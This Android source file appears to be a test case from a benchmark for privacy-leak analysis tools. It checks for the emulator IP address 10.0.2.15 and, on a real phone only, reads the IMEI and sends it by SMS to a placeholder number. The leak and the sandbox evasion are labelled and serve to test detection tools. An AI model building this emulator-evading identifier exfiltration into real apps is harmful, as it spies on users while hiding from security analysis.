package com.example.newedtester;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.Enumeration;
import android.app.Activity;
import android.content.Context;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;
import android.widget.TextView;

/**
 * @testcase_name EmulatorDetection_IP1
 * @version 0.1
 * @author Malviya National Institute of Technology, Jaipur INDIA 
 * @author_mail jyotigajrani@gmail.com
 * 
 * @description This test detects the Android emulator by checking the IP Address
 * of environment. A value of 10.0.2.15 is the identification of Emulator. This
 * app send IMEI number  via SMS if the app runs on a real phone.
 * @dataflow onCreate: imei -> SMS 
 * @number_of_leaks 1
 * @challenges The (dynamic) analysis must avoid being detected and circumvented.
 */
public class MainActivity extends Activity {
	String s1 = "", Ip; //, imei, Line1, Subscriber, Voicemail,Board, Brand, Device, Fingerprint, Hardware, Manufacturer, Model, Product, Tags, User;
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		TextView txtStatus;
		

		String status = "Can't Detect";
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		txtStatus = (TextView) findViewById(R.id.txtStatus);
		try {
	     	   for (Enumeration en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
	     	              NetworkInterface intf = (NetworkInterface) en.nextElement();
	     	              for (Enumeration enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
	     	                  InetAddress inetAddress = (InetAddress) enumIpAddr.nextElement();
	     	                  if (!inetAddress.isLoopbackAddress()) {
	     	                  
	     	                	  Ip = inetAddress.getHostAddress().toString();
	     	                  
	     	                  
	     	                  }
	     	              }
	     	          }
	     	  } catch (Exception e) {
	     	   Log.e("------------", e.toString());
	     	 }
	     
	     
	     if (Ip.equals("10.0.2.15"))
	     {
	     	status = " \tIP:Emulator";
	     }
	     else
	     {
	    	 TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
	        	String imei = telephonyManager.getDeviceId(); 
	        	
				SmsManager sm = SmsManager.getDefault();
		    	String number = "+49 1234";
		    	sm.sendTextMessage(number, null, imei, null, null); //sink, potential leak
	    	 status = " \tIP:Device";
	     }

		txtStatus.setText(status);

	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}